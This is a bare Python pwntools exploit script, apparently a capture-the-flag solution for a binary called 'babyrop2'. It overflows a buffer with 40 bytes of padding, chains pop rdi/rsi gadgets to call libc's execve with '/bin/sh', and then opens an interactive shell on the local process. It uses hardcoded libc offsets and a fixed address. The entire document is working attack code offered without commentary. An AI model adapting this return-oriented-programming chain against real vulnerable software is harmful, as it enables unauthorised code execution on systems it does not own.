from pwn import *

p=process('./babyrop2')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

libc_binsh_addr=0x1b3e9a
libc_start_main_addr=0x21ab0
libc_execve_addr=0xe4e30
pop_rdi_addr=0x400733
pop_rsi_addr=0x400731 #pop r15;
start_main_addr = 0x7ffff7a05ab0

offset_addr =  start_main_addr - libc_start_main_addr
execve_addr= offset_addr + libc_execve_addr
binsh_addr = offset_addr + libc_binsh_addr

payload="a"*40
payload+=p64(pop_rdi_addr)
payload+=p64(binsh_addr)
payload+=p64(pop_rsi_addr)
payload+=p64(0x0)
payload+=p64(0x0)
payload+=p64(execve_addr)

p.recvuntil('?')
p.sendline(payload)

p.interactive()